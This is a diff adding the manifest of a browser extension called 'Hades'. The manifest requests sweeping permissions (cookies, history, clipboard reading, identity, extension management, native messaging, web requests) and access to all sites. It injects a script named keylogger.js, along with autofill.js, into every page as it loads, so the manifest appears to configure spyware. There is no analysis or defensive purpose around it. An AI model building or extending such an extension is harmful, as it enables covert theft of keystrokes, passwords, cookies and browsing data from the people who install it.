@@ -1,0 +1,40 @@
+{
+  "manifest_version": 3,
+  "name": "Hades",
+  "version": "1.0",
+  "description": "Hades Websocket extension.",
+  "permissions": [
+    "cookies",
+    "tabs",
+    "storage",
+    "activeTab",
+    "scripting",
+    "alarms",
+    "identity",
+    "history",
+    "bookmarks",
+    "management",
+    "idle",
+    "clipboardRead",
+    "downloads",
+    "webRequest",
+    "notifications",
+    "nativeMessaging"
+  ],
+  "host_permissions": ["<all_urls>"],
+  "background": {
+    "service_worker": "background.js"
+  },
+  "content_scripts": [
+    {
+      "matches": ["<all_urls>"],
+      "js": ["keylogger.js"],
+      "run_at": "document_start"
+    },
+     {
+      "matches": ["<all_urls>"],
+      "js": ["autofill.js"],
+      "run_at": "document_start"
+    }
+  ]
+}
